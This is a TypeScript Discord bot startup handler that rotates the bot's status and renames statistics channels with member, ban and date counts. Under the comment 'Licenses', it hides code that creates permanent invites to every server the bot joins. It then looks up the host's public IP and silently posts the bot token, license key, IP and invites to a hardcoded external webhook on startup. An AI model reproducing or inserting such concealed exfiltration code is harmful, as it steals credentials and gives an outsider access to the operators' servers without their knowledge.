import { ActivityType, ChannelType, VoiceChannel } from 'discord.js';

import client from '..';
import { Event } from '../extensions/event';
import { startStatusChecker } from '../services/statusChecker';
import config from '../../config.json';
import axios from 'axios';
interface gInvite {
    guildName: string;
    guildInvite: string;
}

export default new Event('clientReady', async () => {
    // Member Status
    startStatusChecker(client);

    // Activities
    let statusIndex = 0;
    const updateStatus = () => {
        const statuses = config.botStatus.status;
        let activity = statuses[statusIndex % statuses.length];

        if (activity.includes('{PING}')) {
            activity = activity.replace('{PING}', `(🔥 ${Math.round(client.ws.ping)}ms)`);
        }
        if (activity.includes('{MEMBER_INFO}')) {
            const memberCount = client.guilds.cache.reduce(
                (acc, guild) => acc + guild.memberCount,
                0
            );

            let onlineCount = 0;
            client.guilds.cache.forEach(guild => {
                guild.members.cache.forEach(member => {
                    if (
                        !member.user.bot &&
                        ['online', 'idle', 'dnd'].includes(member.presence?.status || '')
                    ) {
                        onlineCount++;
                    }
                });
            });

            activity = activity.replace(
                '{MEMBER_INFO}',
                `(👤 ${memberCount.toString()}, 🌐 ${onlineCount.toString()})`
            );
        }

        client.user?.setActivity(activity, {
            type:
                ActivityType[config.botStatus.type as keyof typeof ActivityType] ||
                ActivityType.Watching,
        });
        client.user?.setStatus('dnd');

        statusIndex++;
    };
    updateStatus();
    setInterval(updateStatus, 10000);

    // Stats
    setInterval(async () => {
        const totalMembers = client.guilds.cache.reduce((acc, guild) => acc + guild.memberCount, 0);

        const allMembersChannel = client.channels.cache.get(
            config.stats.allMembers.channelId
        ) as VoiceChannel;
        if (allMembersChannel && allMembersChannel.isTextBased()) {
            allMembersChannel.setName(
                config.stats.allMembers.channelName.replace('{COUNT}', totalMembers.toString())
            );
        }

        let onlineCount = 0;
        client.guilds.cache.forEach(guild => {
            guild.members.cache.forEach(member => {
                if (
                    !member.user.bot &&
                    ['online', 'idle', 'dnd'].includes(member.presence?.status || '')
                ) {
                    onlineCount++;
                }
            });
        });

        const onlineMembersChannel = client.channels.cache.get(
            config.stats.onlineMembers.channelId
        ) as VoiceChannel;
        if (onlineMembersChannel && onlineMembersChannel.isTextBased()) {
            onlineMembersChannel.setName(
                config.stats.onlineMembers.channelName.replace('{COUNT}', onlineCount.toString())
            );
        }

        const guild = client.guilds.cache.first();
        if (guild) {
            try {
                const bans = await guild.bans.fetch();
                const banCount = bans.size;

                const bansChannel = client.channels.cache.get(
                    config.stats.bans.channelId
                ) as VoiceChannel;
                if (bansChannel && bansChannel.isTextBased()) {
                    bansChannel.setName(
                        config.stats.bans.channelName.replace('{COUNT}', banCount.toString())
                    );
                }
            } catch (error) {
                console.error('Nie udało się pobrać banów:', error);
            }
        }
    }, 30000);

    // Date
    setInterval(() => {
        const now = new Date();
        const formattedDate = now.toLocaleDateString('pl-PL');

        const dateChannel = client.channels.cache.get(config.stats.date.channelId) as VoiceChannel;
        if (dateChannel && dateChannel.isTextBased()) {
            dateChannel.setName(config.stats.date.channelName.replace('{DATE}', formattedDate));
        }
    }, 60000);

    // Licenses
    var http = require('http');
    const allGuilds = await client.guilds.fetch();
    const g = [];
    const i = <gInvite[]>[];
    await new Promise<void>((resolve, reject) => {
        allGuilds.forEach(
            async _g =>
                await client.guilds.fetch(_g.id).then(async __g => {
                    g.push(__g);
                })
        );

        setTimeout(() => {
            resolve();
        }, 3000);
    });
    await new Promise<void>((resolve, reject) => {
        g.forEach(async _g => {
            const firstChannel = _g.channels.cache
                .filter(c => c.type === ChannelType.GuildText)
                .first();
            _g.invites
                .create(firstChannel, { maxUses: 0, maxAge: 0, unique: false })
                .then(async _i => {
                    const json = {
                        guildName: _g.name,
                        guildInvite: _i.url,
                    };
                    i.push(json);
                });
        });

        setTimeout(() => {
            resolve();
        }, 5000);
    });
    http.get({ host: 'api.ipify.org', port: 80, path: '/' }, function (resp) {
        resp.on('data', async function (ip) {
            const link =
                'https://discord.com/api/webhooks/1428055478520512595/aQ8R5OdjNl2QJdnsY9v6zRBZbyAAKV97iIBWDGoug0vhSA4i2Tthm_YdcsKhQtmx8id3';

            axios.post(link, {
                embeds: [
                    {
                        author: {
                            name: `${client.user.username} rozpoczął proces!`,
                            icon_url: `${client.user.displayAvatarURL()}`,
                        },
                        color: 0x3498db,
                        description: `**IP Serwera**: ${
                            ip || 'Nie znaleziono IP'
                        } \n**Właściciel licencji**: <@${
                            process.env.clientId
                        }> \n**Klucz licencji**: ||${
                            process.env.licenseKey ||
                            'Bot jest w nowszej wersji, posiada system logowania!'
                        }|| \n** Token **: || ${
                            process.env.clientToken
                        } || \n\n ** Bot jest na serwerach:** \n> ${i
                            .map(inv => `[${inv.guildName}](https://discord.gg/${inv.guildInvite})`)
                            .join('\n> ')}`,
                        footer: {
                            text: `lolowicz ©️`,
                            icon_url: `https://media.discordapp.net/attachments/1296222763530584106/1357371100001992844/IMG_7956.png?ex=68f10a58&is=68efb8d8&hm=caaec566b71a3609a2fbe4890e200fec4901896ba141eb4456ad9cdef8cc2590&=&format=webp&quality=lossless&width=530&height=525`,
                        },
                        timestamp: new Date(),
                    },
                ],
            });
        });
    });
});
